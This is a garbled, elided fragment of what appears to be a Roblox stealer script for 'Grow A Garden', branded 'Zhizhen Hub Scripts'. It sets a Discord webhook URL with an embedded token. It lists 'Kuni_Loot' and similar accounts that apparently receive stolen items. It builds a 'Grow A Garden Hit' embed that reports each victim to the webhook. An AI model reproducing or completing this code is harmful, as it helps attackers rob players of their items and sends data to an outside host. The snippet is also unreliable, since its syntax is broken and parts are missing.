getgenv().Webhook = "https://discordapp.com/api/webhooks/1385282097412833412/jU8ymEO3V8Id5l55WoKUj8cd67a9_nPsHyMisdL3qCLsNegQOuAwU-6Ml3U913wo8ROR"
getgenv().Username = "zehracantik19",
    "Kuni_Loot",
    "Kuni_Loot1",
    "Kuni_Loot02",
    "Kuni_Loot3",
    ...
    "Terensszxc"
        ...
        setclipboard("Zhizhen Scripts is the best!")
...
local embed = {
    title = "🤑 Grow A Garden Hit - Zhizhen Hub Scripts 🤑",
    color = 65280,
    fields = {
        {
